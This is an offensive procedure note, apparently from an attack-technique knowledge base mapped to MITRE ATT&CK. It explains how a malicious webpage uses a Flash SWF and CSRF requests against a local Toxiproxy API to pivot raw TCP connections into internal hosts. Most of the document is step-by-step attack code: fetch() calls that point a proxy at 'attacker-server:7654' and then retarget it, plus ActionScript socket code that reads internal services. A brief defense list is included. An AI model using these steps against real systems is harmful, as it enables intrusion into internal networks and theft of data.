---
tags:
  - flash
  - tcp-pivot
  - socket
type: procedure
tools:
  - '[[tools/Adobe-Flash]]'
  - '[[tools/Adobe-Flex-SDK]]'
  - '[[tools/toxiproxy]]'
tactics:
  - '[[Lateral Movement]]'
  - '[[Collection]]'
commands: []
platforms:
  - Web
techniques:
  - '[[Connection Proxy]]'
  - '[[Exfiltration Over Command and Control Channel]]'
skill_level: advanced
impact_level: high
detection_risk: high
sub_techniques: []
id: 9fcfd198-af25-4fa6-ade5-47c9d600a1bc
created_at: '2025-12-14T17:27:29.711Z'
updated_at: '2025-12-14T17:27:29.711Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Lateral Movement]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Connection Proxy]]'
  - '[[Exfiltration Over Command and Control Channel]]'
---
# Use-Adobe-Flash-for-Arbitrary-TCP-Connections

## Summary

This procedure embeds an Adobe Flash SWF in a malicious webpage to establish raw TCP socket connections through CSRF-controlled Toxiproxy proxies, caching crossdomain policy permissions to pivot to internal hosts and read/write TCP data.

## Description

Flash sockets bypass browser TCP restrictions after loading a policy file via a proxied connection. CSRF creates a 'policy' proxy to the attacker's server for initial permission caching, then updates it to target internal services. This allows direct TCP interaction, exfiltrating data from unauthenticated internal endpoints.

## Requirements

1. Victim browser with Flash Player enabled
2. Adobe Flex SDK for SWF compilation
3. CSRF-capable Toxiproxy instance
4. Attacker server on port 7654 for policy file

## Defense

Defensive measures and detection strategies:

- Disable Flash in browsers and block SWF loading
- Validate policy file requests on internal services
- Network segmentation to prevent proxy-based pivoting
- Monitor for Flash socket connections to localhost ports

## Objectives

1. Cache Flash crossdomain permissions via proxy
2. Pivot TCP connections to internal hosts
3. Exfiltrate data over proxied channels

## Instructions

### Step 1: Embed and Create Policy Proxy

**Context**: Load SWF and CSRF create 'policy' proxy to attacker:7654.

Embed SWF:

```html
<object width="1" height="1" data="exploit.swf" type="application/x-shockwave-flash"></object>
```

CSRF POST:

```javascript
fetch('http://localhost:8474/proxies', {
  method: 'POST',
  mode: 'no-cors',
  body: JSON.stringify({name: 'policy', listen: '127.0.0.1:7654', upstream: 'attacker-server:7654', enabled: true})
});
```

> Serves attacker's policy.xml via proxy.

### Step 2: Cache Permissions

**Context**: Connect Flash socket to policy proxy to fetch and cache permissions.

In SWF (ActionScript via [[tools/Adobe-Flex-SDK]]):

```actionscript
import flash.net.Socket;
var policySocket:Socket = new Socket();
policySocket.connect("127.0.0.1", 7654);
policySocket.addEventListener(Event.CONNECT, onPolicyConnect);
function onPolicyConnect(e:Event):void {
  // Policy cached, ready for TCP
}
```

> Expected: Permissions for all domains cached.

### Step 3: Pivot and Communicate

**Context**: CSRF update upstream to internal target, then use socket for TCP.

CSRF update:

```javascript
fetch('http://localhost:8474/proxies/policy', {
  method: 'POST',
  mode: 'no-cors',
  body: JSON.stringify({upstream: {url: 'internal-host:80'}})
});
```

Reconnect socket:

```actionscript
var tcpSocket:Socket = new Socket();
tcpSocket.connect("127.0.0.1", 7654);
tcpSocket.writeUTFBytes("GET / HTTP/1.1\r\nHost: internal-host\r\n\r\n");
// Read response via data event
```

> Expected: Internal service response data.

## MITRE ATT&CK Mapping

### Tactics

- [[Lateral Movement]]
- [[Collection]]

### Techniques

- [[Connection Proxy]]
- [[Exfiltration Over Command and Control Channel]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/Adobe-Flash]]
- [[tools/Adobe-Flex-SDK]]
- [[tools/toxiproxy]]

## Tags

- flash
- tcp-pivot
- socket
